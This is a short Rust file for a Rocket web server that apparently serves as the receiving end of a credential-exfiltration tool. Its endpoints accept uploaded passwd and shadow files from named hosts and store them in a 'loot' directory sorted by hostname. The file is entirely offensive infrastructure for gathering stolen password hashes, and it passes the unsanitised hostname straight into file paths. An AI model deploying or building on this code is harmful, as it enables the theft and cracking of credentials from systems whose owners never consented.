#[macro_use] extern crate rocket;

use rocket::{Data, response::Debug, tokio, data::ToByteUnit};
use std::{io::Error, io::Write, env, fs::File, fs};

#[get("/")]
fn index() -> &'static str {
    "Web interface in development, not yet implemented, please use the command line client"
}

#[post("/post/<hostname>/passwd", format = "plain", data = "<data>")]
async fn passwd(data: Data<'_>, hostname: String) -> std::io::Result<()> {
    
    //create directory and declare location for the passwd file
    let file_location = format!("loot/{}/passwd", hostname);
    println!("File location is {}.", file_location);

    let dir = format!("loot/{}", hostname);
    fs::create_dir_all(&dir);
    println!("The dir created is {}.", &dir);

    let mut file = File::create(&file_location)?;
    let stream = data.open(1.megabytes()).into_file(file_location).await?;

    Ok(())
}

#[post("/post/<hostname>/shadow", format = "plain", data = "<data>")]
async fn shadow(data: Data<'_>, hostname: String) -> std::io::Result<()> {
    let file_location = format!("loot/{}/shadow", hostname);
    
    let dir = format!("loot/{}", hostname);
    fs::create_dir_all(&dir);
    
    let mut file = File::create(&file_location)?;
    let stream = data.open(1.megabytes()).into_file(file_location).await?;
    Ok(())
}

#[launch]
fn rocket() -> _ {
    rocket::build().mount("/", routes![index, passwd, shadow])
}
